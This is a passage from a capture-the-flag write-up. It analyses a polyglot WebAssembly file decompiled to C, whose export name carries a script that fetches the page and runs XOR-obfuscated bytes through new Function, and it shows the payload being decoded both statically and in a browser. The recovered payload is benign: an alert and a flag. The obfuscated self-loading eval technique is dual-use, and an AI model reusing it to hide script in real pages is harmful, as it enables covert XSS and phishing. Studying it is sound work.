  0x1c, 0x01, 0x55, 0x1a, 0x07, 0x55, 0x1b, 0x1a, 0x01, 0x59, 0x55, 0x1c,
  0x13, 0x55, 0x0c, 0x1a, 0x00, 0x55, 0x06, 0x10, 0x10, 0x55, 0x14, 0x1b,
  0x55, 0x10, 0x07, 0x07, 0x1a, 0x07, 0x55, 0x17, 0x10, 0x19, 0x1a, 0x02,
  0x59, 0x55, 0x01, 0x1d, 0x14, 0x01, 0x55, 0x18, 0x10, 0x14, 0x1b, 0x06,
  0x55, 0x1c, 0x01, 0x06, 0x55, 0x02, 0x1a, 0x07, 0x1e, 0x1c, 0x1b, 0x12,
  0x52, 0x5c, 0x4e, 0x7f, 0x55, 0x55, 0x55, 0x55,
};

static void init_memories(w2c_download* instance) {
  LOAD_DATA((*instance->w2c_js_mem), 0u, data_segment_data_w2c_download_d0, 4);
  LOAD_DATA((*instance->w2c_js_mem), 4u, data_segment_data_w2c_download_d1, 4);
  LOAD_DATA((*instance->w2c_js_mem), 8u, data_segment_data_w2c_download_d2, 4);
  LOAD_DATA((*instance->w2c_js_mem), 12u, data_segment_data_w2c_download_d3, 4);
  LOAD_DATA((*instance->w2c_js_mem), 16u, data_segment_data_w2c_download_d4, 12);
  LOAD_DATA((*instance->w2c_js_mem), 28u, data_segment_data_w2c_download_d5, 200);
}

static void init_data_instances(w2c_download *instance) {
}

/* export: '<script>var m = new WebAssembly.Memory({ initial: 1 });fetch(location,{mode:'no-cors'}).then(e=>e.arrayBuffer()).then(e=>WebAssembly.instantiate(e,{x:{y: function(o, l){new Function(new TextDecoder('utf8').decode(new Uint8Array(m.buffer, o, l)))();}}, js: {mem: m}}));<\2Fscript>' */
void w2c_download_0x3Cscript0x3Evar0x20m0x200x3D0x20new0x20WebAssembly0x2EMemory0x280x7B0x20initial0x3A0x2010x200x7D0x290x3Bfetch0x28location0x2C0x7Bmode0x3A0x27no0x2Dcors0x270x7D0x290x2Ethen0x28e0x3D0x3Ee0x2EarrayBuffer0x280x290x290x2Ethen0x28e0x3D0x3EWebAssembly0x2Einstantiate0x28e0x2C0x7Bx0x3A0x7By0x3A0x20function0x28o0x2C0x20l0x290x7Bnew0x20Function0x28new0x20TextDecoder0x280x27utf80x270x290x2Edecode0x28new0x20Uint8Array0x28m0x2Ebuffer0x2C0x20o0x2C0x20l0x290x290x290x280x290x3B0x7D0x7D0x2C0x20js0x3A0x200x7Bmem0x3A0x20m0x7D0x7D0x290x290x3B0x3C0x2Fscript0x3E(w2c_download* instance) {
  return w2c_download_0x3Cscript0x3Evar0x20m0x200x3D0x20new0x20WebAssembly0x2EMemory0x280x7B0x20initial0x3A0x2010x200x7D0x290x3Bfetch0x28location0x2C0x7Bmode0x3A0x27no0x2Dcors0x270x7D0x290x2Ethen0x28e0x3D0x3Ee0x2EarrayBuffer0x280x290x290x2Ethen0x28e0x3D0x3EWebAssembly0x2Einstantiate0x28e0x2C0x7Bx0x3A0x7By0x3A0x20function0x28o0x2C0x20l0x290x7Bnew0x20Function0x28new0x20TextDecoder0x280x27utf80x270x290x2Edecode0x28new0x20Uint8Array0x28m0x2Ebuffer0x2C0x20o0x2C0x20l0x290x290x290x280x290x3B0x7D0x7D0x2C0x20js0x3A0x200x7Bmem0x3A0x20m0x7D0x7D0x290x290x3B0x3C0x2Fscript0x3E_0(instance);
}

static void init_instance_import(w2c_download* instance, struct w2c_js* w2c_js_instance, struct w2c_x* w2c_x_instance){
  instance->w2c_x_instance = w2c_x_instance;
  instance->w2c_js_mem = w2c_js_mem(w2c_js_instance);
}

const u64 wasm2c_download_min_js_mem = 1;
const u64 wasm2c_download_max_js_mem = 65536;
const u8 wasm2c_download_is64_js_mem = 0;

void wasm2c_download_instantiate(w2c_download* instance, struct w2c_js* w2c_js_instance, struct w2c_x* w2c_x_instance) {
  assert(wasm_rt_is_initialized());
  init_instance_import(instance, w2c_js_instance, w2c_x_instance);
  init_memories(instance);
  init_data_instances(instance);
  w2c_download_0x3Cscript0x3Evar0x20m0x200x3D0x20new0x20WebAssembly0x2EMemory0x280x7B0x20initial0x3A0x2010x200x7D0x290x3Bfetch0x28location0x2C0x7Bmode0x3A0x27no0x2Dcors0x270x7D0x290x2Ethen0x28e0x3D0x3Ee0x2EarrayBuffer0x280x290x290x2Ethen0x28e0x3D0x3EWebAssembly0x2Einstantiate0x28e0x2C0x7Bx0x3A0x7By0x3A0x20function0x28o0x2C0x20l0x290x7Bnew0x20Function0x28new0x20TextDecoder0x280x27utf80x270x290x2Edecode0x28new0x20Uint8Array0x28m0x2Ebuffer0x2C0x20o0x2C0x20l0x290x290x290x280x290x3B0x7D0x7D0x2C0x20js0x3A0x200x7Bmem0x3A0x20m0x7D0x7D0x290x290x3B0x3C0x2Fscript0x3E_0(instance);
}

void wasm2c_download_free(w2c_download* instance) {
}

wasm_rt_func_type_t wasm2c_download_get_func_type(uint32_t param_count, uint32_t result_count, ...) {
  va_list args;

  if (param_count == 2 && result_count == 0) {
    va_start(args, result_count);
    if (true && va_arg(args, wasm_rt_type_t) == WASM_RT_I32 && va_arg(args, wasm_rt_type_t) == WASM_RT_I32) {
      va_end(args);
      return w2c_download_t0;
    }
    va_end(args);
  }

  if (param_count == 0 && result_count == 0) {
    va_start(args, result_count);
    if (true) {
      va_end(args);
      return w2c_download_t1;
    }
    va_end(args);
  }

  return NULL;
}

void w2c_download_f1(w2c_download* instance, u32 var_p0, u32 var_p1) {
  FUNC_PROLOGUE;
  u32 var_i0, var_i1, var_i2;
  var_i0 = 8u;
  var_i1 = var_p0;
  i32_store(instance->w2c_js_mem, (u64)(var_i0), var_i1);
  var_i0 = 8u;
  var_i0 = i32_load(instance->w2c_js_mem, (u64)(var_i0));
  var_i1 = 4u;
  var_i1 = i32_load(instance->w2c_js_mem, (u64)(var_i1));
  var_i2 = 8u;
  var_i2 = i32_load(instance->w2c_js_mem, (u64)(var_i2));
  var_i2 = i32_load(instance->w2c_js_mem, (u64)(var_i2));
  var_i1 ^= var_i2;
  i32_store(instance->w2c_js_mem, (u64)(var_i0), var_i1);
  var_i0 = 12u;
  var_i0 = i32_load(instance->w2c_js_mem, (u64)(var_i0));
  var_i1 = 8u;
  var_i1 = i32_load(instance->w2c_js_mem, (u64)(var_i1));
  var_i0 = var_i0 == var_i1;
  if (var_i0) {goto var_B0;}
  var_i0 = 8u;
  var_i1 = 8u;
  var_i1 = i32_load(instance->w2c_js_mem, (u64)(var_i1));
  var_i2 = 4u;
  var_i1 += var_i2;
  i32_store(instance->w2c_js_mem, (u64)(var_i0), var_i1);
  var_i0 = 8u;
  var_i0 = i32_load(instance->w2c_js_mem, (u64)(var_i0));
  var_i1 = var_p1;
  w2c_download_f1(instance, var_i0, var_i1);
  var_B0:;
  FUNC_EPILOGUE;
}

void w2c_download_0x3Cscript0x3Evar0x20m0x200x3D0x20new0x20WebAssembly0x2EMemory0x280x7B0x20initial0x3A0x2010x200x7D0x290x3Bfetch0x28location0x2C0x7Bmode0x3A0x27no0x2Dcors0x270x7D0x290x2Ethen0x28e0x3D0x3Ee0x2EarrayBuffer0x280x290x290x2Ethen0x28e0x3D0x3EWebAssembly0x2Einstantiate0x28e0x2C0x7Bx0x3A0x7By0x3A0x20function0x28o0x2C0x20l0x290x7Bnew0x20Function0x28new0x20TextDecoder0x280x27utf80x270x290x2Edecode0x28new0x20Uint8Array0x28m0x2Ebuffer0x2C0x20o0x2C0x20l0x290x290x290x280x290x3B0x7D0x7D0x2C0x20js0x3A0x200x7Bmem0x3A0x20m0x7D0x7D0x290x290x3B0x3C0x2Fscript0x3E_0(w2c_download* instance) {
  FUNC_PROLOGUE;
  u32 var_i0, var_i1, var_i2;
  var_i0 = 0u;
  var_i0 = i32_load(instance->w2c_js_mem, (u64)(var_i0));
  var_i1 = 1000u;
  var_i0 = var_i0 != var_i1;
  if (var_i0) {goto var_B0;}
  var_i0 = 28u;
  var_i1 = 8728u;
  w2c_download_f1(instance, var_i0, var_i1);
  var_i0 = 28u;
  var_i1 = 8728u;
  (*w2c_x_y)(instance->w2c_x_instance, var_i0, var_i1);
  var_B0:;
  var_i0 = 0u;
  var_i1 = 0u;
  var_i1 = i32_load(instance->w2c_js_mem, (u64)(var_i1));
  var_i2 = 1u;
  var_i1 += var_i2;
  i32_store(instance->w2c_js_mem, (u64)(var_i0), var_i1);
  var_i0 = 16u;
  var_i1 = 12u;
  w2c_download_f1(instance, var_i0, var_i1);
  var_i0 = 16u;
  var_i1 = 12u;
  (*w2c_x_y)(instance->w2c_x_instance, var_i0, var_i1);
  var_i0 = 16u;
  var_i0 = i32_load(instance->w2c_js_mem, (u64)(var_i0));
  var_i1 = 1969382756u;
  var_i0 = var_i0 == var_i1;
  if (var_i0) {goto var_B1;}
  var_i0 = 16u;
  var_i1 = 1969382756u;
  i32_store(instance->w2c_js_mem, (u64)(var_i0), var_i1);
  var_i0 = 20u;
  var_i1 = 1919248231u;
  i32_store(instance->w2c_js_mem, (u64)(var_i0), var_i1);
  var_i0 = 24u;
  var_i1 = 538976315u;
  i32_store(instance->w2c_js_mem, (u64)(var_i0), var_i1);
  var_B1:;
  var_i0 = 16u;
  var_i1 = 12u;
  w2c_download_f1(instance, var_i0, var_i1);
  var_i0 = 0u;
  var_i0 = i32_load(instance->w2c_js_mem, (u64)(var_i0));
  var_i1 = 1000u;
  var_i0 = var_i0 > var_i1;
  if (var_i0) {goto var_B2;}
  w2c_download_0x3Cscript0x3Evar0x20m0x200x3D0x20new0x20WebAssembly0x2EMemory0x280x7B0x20initial0x3A0x2010x200x7D0x290x3Bfetch0x28location0x2C0x7Bmode0x3A0x27no0x2Dcors0x270x7D0x290x2Ethen0x28e0x3D0x3Ee0x2EarrayBuffer0x280x290x290x2Ethen0x28e0x3D0x3EWebAssembly0x2Einstantiate0x28e0x2C0x7Bx0x3A0x7By0x3A0x20function0x28o0x2C0x20l0x290x7Bnew0x20Function0x28new0x20TextDecoder0x280x27utf80x270x290x2Edecode0x28new0x20Uint8Array0x28m0x2Ebuffer0x2C0x20o0x2C0x20l0x290x290x290x280x290x3B0x7D0x7D0x2C0x20js0x3A0x200x7Bmem0x3A0x20m0x7D0x7D0x290x290x3B0x3C0x2Fscript0x3E_0(instance);
  var_B2:;
  FUNC_EPILOGUE;
}
```

This is only half of the file I got, but the first half is very boilerplate, so we'll ignore it. Looking at this, I was stuck for a long while, but I eventually had the epiphany of "Where is the XSS happening?" If I can't immediately see it, that means it's hidden, so the byte arrays at the top must have it encoded or something. If we take those bytes and attempt to parse them as prinatble characters, we get nothing. However, the easiest way to hide something like this is to do a single byte XOR, so I used Cyberchef's XOR Bruteforce module to test every possible key.

> All non printable characters have been replaced with '.'. The Cyberchef link is [here](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR_Brute_Force(1,100,0,'Standard',false,true,false,'')&input=ICAweDAwLCAweDAwLCAweDAwLCAweDAwLAoKCiAgMHg3NSwgMHg3NSwgMHg3NSwgMHg3NSwKCiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwKCiAgMHgzNCwgMHgyMiwgMHgwMCwgMHgwMCwKICAweDExLCAweDEwLCAweDE3LCAweDAwLCAweDEyLCAweDEyLCAweDEwLCAweDA3LCAweDRlLCAweDU1LCAweDU1LCAweDU1LAoKICAweDE0LCAweDE5LCAweDEwLCAweDA3LCAweDAxLCAweDVkLCAweDUyLCAweDExLCAweDFhLCAweDU1LCAweDBjLCAweDFhLAogIDB4MDAsIDB4NTUsIDB4MTAsIDB4MDMsIDB4MTAsIDB4MDcsIDB4MGMsIDB4NTUsIDB4MDIsIDB4MWEsIDB4MDcsIDB4MDcsCiAgMHgwYywgMHg1NSwgMHgxNCwgMHgxNywgMHgxYSwgMHgwMCwgMHgwMSwgMHg1NSwgMHgwMiwgMHgxZCwgMHgxNCwgMHgwMSwKICAweDU1LCAweDAyLCAweDFhLCAweDAwLCAweDE5LCAweDExLCAweDU1LCAweDFkLCAweDE0LCAweDA1LCAweDA1LCAweDEwLAogIDB4MWIsIDB4NTUsIDB4MWMsIDB4MTMsIDB4NTUsIDB4MDUsIDB4MWQsIDB4MWMsIDB4MDYsIDB4MWQsIDB4MWMsIDB4MWIsCiAgMHgxMiwgMHg1NSwgMHgwNSwgMHgxNCwgMHgxMiwgMHgxMCwgMHgwNiwgMHg1NSwgMHgxNCwgMHgxNiwgMHgwMSwgMHgwMCwKICAweDE0LCAweDE5LCAweDE5LCAweDBjLCAweDU1LCAweDAxLCAweDA3LCAweDFjLCAweDEwLCAweDExLCAweDRhLCAweDUyLAogIDB4NWMsIDB4NGUsIDB4N2YsIDB4MTMsIDB4MTksIDB4MTQsIDB4MTIsIDB4NTUsIDB4NDgsIDB4NTUsIDB4NTIsIDB4MWQsCiAgMHgxYywgMHgxMCwgMHgwNywgMHgxYSwgMHgxMiwgMHgxOSwgMHgwYywgMHgwNSwgMHgxZCwgMHgxYywgMHgxNiwgMHgwNiwKICAweDUyLCAweDRlLCAweDdmLCAweDE2LCAweDFhLCAweDFiLCAweDA2LCAweDFhLCAweDE5LCAweDEwLCAweDViLCAweDE5LAogIDB4MWEsIDB4MTIsIDB4NWQsIDB4NTIsIDB4MTcsIDB4MTAsIDB4MTksIDB4MWMsIDB4MTAsIDB4MDMsIDB4MTAsIDB4NTUsCiAgMHgxYywgMHgwMSwgMHg1NSwgMHgxYSwgMHgwNywgMHg1NSwgMHgxYiwgMHgxYSwgMHgwMSwgMHg1OSwgMHg1NSwgMHgxYywKICAweDEzLCAweDU1LCAweDBjLCAweDFhLCAweDAwLCAweDU1LCAweDA2LCAweDEwLCAweDEwLCAweDU1LCAweDE0LCAweDFiLAogIDB4NTUsIDB4MTAsIDB4MDcsIDB4MDcsIDB4MWEsIDB4MDcsIDB4NTUsIDB4MTcsIDB4MTAsIDB4MTksIDB4MWEsIDB4MDIsCiAgMHg1OSwgMHg1NSwgMHgwMSwgMHgxZCwgMHgxNCwgMHgwMSwgMHg1NSwgMHgxOCwgMHgxMCwgMHgxNCwgMHgxYiwgMHgwNiwKICAweDU1LCAweDFjLCAweDAxLCAweDA2LCAweDU1LCAweDAyLCAweDFhLCAweDA3LCAweDFlLCAweDFjLCAweDFiLCAweDEyLAogIDB4NTIsIDB4NWMsIDB4NGUsIDB4N2YsIDB4NTUsIDB4NTUsIDB4NTUsIDB4NTUsCg)
```
Key = 73: ssss....ssssGQssbcdsaact=&&&gjctr.!bi&.is&cpct.&qitt.&gdisr&qngr&qisjb&ngvvch&o`&vnounoha&vgacu&gers
Key = 74: tttt....tttt@Vttedctffds:!!!`mdsu)&en!xnt!dwdsx!vnssx!`cntu!vi`u!vntme!i`qqdo!hg!qihrihof!q`fdr!`but
Key = 75: uuuu....uuuuAWuudebugger;   alert('do you every worry about what would happen if phishing pages actu
Key = 76: vvvv....vvvvBTvvgfavddfq8###bofqw+$gl#zlv#fufqz#tlqqz#balvw#tkbw#tlvog#kbssfm#je#skjpkjmd#sbdfp#b`wv
Key = 77: wwww....wwwwCUwwfg`weegp9"""cngpv*%fm"{mw"gtgp{"umpp{"c`mwv"ujcv"umwnf"jcrrgl"kd"rjkqjkle"rcegq"cavw
```

If we XOR the payload with `0x75`, we find the flag.

```js
uuuu....uuuuAWuudebugger;   alert('do you every worry about what would happen if phishing pages actually tried?');
flag = 'hieroglyphics';
console.log('believe it or not, if you see an error below, that means its working');
```

In hindsight, this makes a lot of sense. The `long`s in the middle, when converted to hex and treated as ASCII, correspond to "debugger;   ". We can follow that down to the `w2c_download_f1` function, where we are loading and storing values, but eventually doing `var_i1 ^= var_i2;`. The loads and stores seem to be happening to the result of `init_memories`, which uses the byte arrays we identified to initialize the VM's memory. Let's focus in right before the XOR:

```c
  var_i1 = 4u;
  var_i1 = i32_load(instance->w2c_js_mem, (u64)(var_i1));
  var_i2 = 8u;
  var_i2 = i32_load(instance->w2c_js_mem, (u64)(var_i2));
  var_i2 = i32_load(instance->w2c_js_mem, (u64)(var_i2));
  var_i1 ^= var_i2;
```

The first load command seems to specify an offset of 4 from the initialized memory to put 4 bytes (i.e. bytes 4-8) in `var_i1`, and the second/third are putting bytes 8-12 into `var_i2`. These values are then XORed. The value that is put into `var_i1` is `0x75757575`. Without trying to confuse ourselves by dissecting the rest of the function, we can reasonably assume (also based off of our educated guess from earlier) that `var_i1` is the XOR key, and the larger array of bytes is what's being incrementally XORed.

**flag**: `hieroglyphics`

### Dynamically
> Credit to [HGB](https://joshnickels.com/) for showing me this

Instead of going through the hassle of decompiling it, we can try to run it and debug in the browser. The module already basically shows us how to run it in the browser. I'll spin up a webserver using `python3 -m http.server 80`, and host the below files, including `download.wasm`.

`index.html`
```html
<!DOCTYPE html>
<html>
<head>
  <meta charset='utf-8'>
  <style>
  </style>
</head>
<body>
<h1>Prayge</h1>  
<script src="main.js"></script>
</body>
</html>
```

`main.js`
```js
var m = new WebAssembly.Memory({ initial: 1 });
fetch('download.wasm').then(e=>e.arrayBuffer()).then(e=>WebAssembly.instantiate(e,{x:{y: function(o, l){
  new Function(new TextDecoder('utf8').decode(new Uint8Array(m.buffer, o, l)))();
}}, js: {mem: m}}));
```

If I visit `http://127.0.0.1/index.html` in Chrome, I hit a debugger. If I turn breakpoints off and let it run, we're hit with an alert: "do you every worry about what would happen if phishing pages actually tried?"

The console has the following error:
```
Uncaught (in promise) ReferenceError: uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu[trim...] is not defined VM1248:6
```

If I click on `VM1248:6`, I'm brought to the actual payload.

```js
(function anonymous() {
    alert('do you every worry about what would happen if phishing pages actually tried?');
    flag = 'hieroglyphics';
    console.log('believe it or not, if you see an error below, that means its working');
    uuuuuuuuuuuuuuuuuuuuuu[trim...]
}
)
```